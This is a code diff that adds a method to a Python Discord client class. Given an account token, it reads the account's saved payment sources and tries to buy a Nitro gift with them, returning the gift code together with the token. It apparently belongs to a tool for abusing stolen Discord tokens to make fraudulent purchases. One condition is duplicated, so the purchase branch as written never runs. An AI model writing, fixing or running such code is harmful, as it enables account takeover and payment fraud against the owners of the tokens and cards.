@@ -61,3 +61,39 @@ class Discord:
             headers = self.headers
         )
         return self.check_status(r)
+    
+    def buy_nitro(self):
+        r = requests.get(
+            url = 'https://discordapp.com/api/v6/users/@me/billing/payment-sources', 
+            headers = self.headers
+        )
+
+        if r.status_code == 200 and "[]" in r.text:
+            return(f'No Payment Method, {self.token}')
+
+        elif "You need to verify your account in order to perform this action." in r.text:
+            return(f'Unverified Token, {self.token}')
+
+        elif r.status_code == 200:
+
+            payment_source_id = r.json()[0]['id']
+
+            if '"invalid": true' in r.text:
+                return(f'Invalid Payment, {self.token}')
+
+            elif 'This purchase request is invalid.' in r.text:
+                return(f'Invalid Payment, {self.token}')
+
+            elif '"invalid": true' in r.text:
+                r = requests.post(
+                    url = f'https://discord.com/api/v6/store/skus/521847234246082599/purchase', 
+                    headers = self.headers, 
+                    json = {'expected_amount': '999','gift': True, 'payment_source_id': payment_source_id}
+                )
+                return(f'discord.gift/{r.json()["gift_code"]}, {self.token}')
+
+            else:
+                return(f'Invalid Payment, {self.token}')
+
+        elif r.status_code == 401:
+            return(f'Invalid Token, {self.token}')
